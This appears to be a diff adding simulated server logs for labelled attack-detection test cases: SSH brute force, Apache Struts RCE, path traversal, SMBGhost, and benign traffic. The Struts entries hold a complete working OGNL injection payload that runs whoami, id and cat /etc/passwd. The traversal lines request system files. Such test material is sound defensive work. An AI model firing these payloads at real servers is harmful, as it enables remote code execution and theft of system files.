@@ -1,0 +1,58 @@
+# ==============================================
+# LOGS FOR CASE 1: SSH Brute Force Attack
+# Targeting 192.168.1.10 on port 22
+# ==============================================
+45.33.22.11 - - [24/Aug/2026:02:15:23 +0000] "SSH" 500 512 - "Failed password for root from 45.33.22.11"
+45.33.22.11 - - [24/Aug/2026:02:15:25 +0000] "SSH" 500 512 - "Failed password for admin from 45.33.22.11"
+45.33.22.11 - - [24/Aug/2026:02:15:27 +0000] "SSH" 500 512 - "Failed password for user from 45.33.22.11"
+203.0.113.5 - - [24/Aug/2026:02:16:10 +0000] "SSH" 500 512 - "Failed password for root from 203.0.113.5"
+203.0.113.5 - - [24/Aug/2026:02:16:12 +0000] "SSH" 500 512 - "Failed password for admin from 203.0.113.5"
+203.0.113.5 - - [24/Aug/2026:02:16:14 +0000] "SSH" 500 512 - "Failed password for user from 203.0.113.5"
+203.0.113.5 - - [24/Aug/2026:02:16:16 +0000] "SSH" 500 512 - "Failed password for oracle from 203.0.113.5"
+45.33.22.11 - - [24/Aug/2026:02:17:00 +0000] "SSH" 500 512 - "Failed password for root from 45.33.22.11"
+45.33.22.11 - - [24/Aug/2026:02:17:02 +0000] "SSH" 500 512 - "Failed password for root from 45.33.22.11"
+
+# ==============================================
+# LOGS FOR CASE 2: Apache Struts RCE Exploit
+# Targeting 10.10.10.25 on port 8080
+# ==============================================
+198.51.100.7 - - [24/Aug/2026:03:20:00 +0000] "POST /struts2-showcase/ HTTP/1.1" 500 1024 "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+198.51.100.7 - - [24/Aug/2026:03:20:02 +0000] "POST /struts2-showcase/ HTTP/1.1" 500 1024 "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+198.51.100.7 - - [24/Aug/2026:03:20:04 +0000] "POST /struts2-showcase/ HTTP/1.1" 500 1024 "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/passwd').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+# ==============================================
+# LOGS FOR CASE 3: Path Traversal Attack
+# Targeting 192.168.1.10 on port 80
+# ==============================================
+185.220.101.1 - - [24/Aug/2026:04:10:00 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1024
+185.220.101.1 - - [24/Aug/2026:04:10:02 +0000] "GET /download?file=../../../../etc/hosts HTTP/1.1" 200 1024
+185.220.101.1 - - [24/Aug/2026:04:10:04 +0000] "GET /download?file=../../../../var/log/syslog HTTP/1.1" 200 1024
+185.220.101.1 - - [24/Aug/2026:04:10:06 +0000] "GET /download?file=..\\..\\..\\windows\\win.ini HTTP/1.1" 200 1024
+
+# ==============================================
+# LOGS FOR CASE 4: SMBGhost (No specific HTTP logs, but let's simulate SMB connections)
+# Targeting 10.10.10.25 on port 445
+# ==============================================
+198.51.100.7 - - [24/Aug/2026:05:00:00 +0000] "SMB" 500 512 - "SMB Negotiate Protocol request"
+198.51.100.7 - - [24/Aug/2026:05:00:02 +0000] "SMB" 500 512 - "SMB Compression Transform Header"
+198.51.100.7 - - [24/Aug/2026:05:00:04 +0000] "SMB" 500 512 - "SMB Remote Code Execution Attempt"
+198.51.100.7 - - [24/Aug/2026:05:00:06 +0000] "SMB" 500 512 - "SMBGhost Exploit Payload"
+
+# ==============================================
+# CASE 5: FALSE POSITIVE (Internal CI/CD Traffic)
+# Targeting 192.168.1.10:443 - ONLY internal IPs
+# ==============================================
+10.0.0.2 - - [24/Aug/2026:06:00:00 +0000] "GET /health HTTP/1.1" 200 1024
+10.0.0.3 - - [24/Aug/2026:06:01:00 +0000] "GET /ready HTTP/1.1" 200 1024
+10.0.0.2 - - [24/Aug/2026:06:02:00 +0000] "GET /health HTTP/1.1" 200 1024
+10.0.0.3 - - [24/Aug/2026:06:03:00 +0000] "GET /ready HTTP/1.1" 200 1024
+10.0.0.2 - - [24/Aug/2026:06:04:00 +0000] "GET /health HTTP/1.1" 200 1024
+
+# ==============================================
+# CASE 10: Tomcat Manager (No suspicious logs)
+# Targeting 192.168.1.30:8080 - NORMAL traffic only
+# ==============================================
+192.168.1.5 - - [24/Aug/2026:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1024
+192.168.1.5 - - [24/Aug/2026:10:00:15 +0000] "GET /about.html HTTP/1.1" 200 1024
+192.168.1.5 - - [24/Aug/2026:10:00:30 +0000] "GET /contact.html HTTP/1.1" 200 1024
+192.168.1.5 - - [24/Aug/2026:10:00:45 +0000] "GET /favicon.ico HTTP/1.1" 404 256
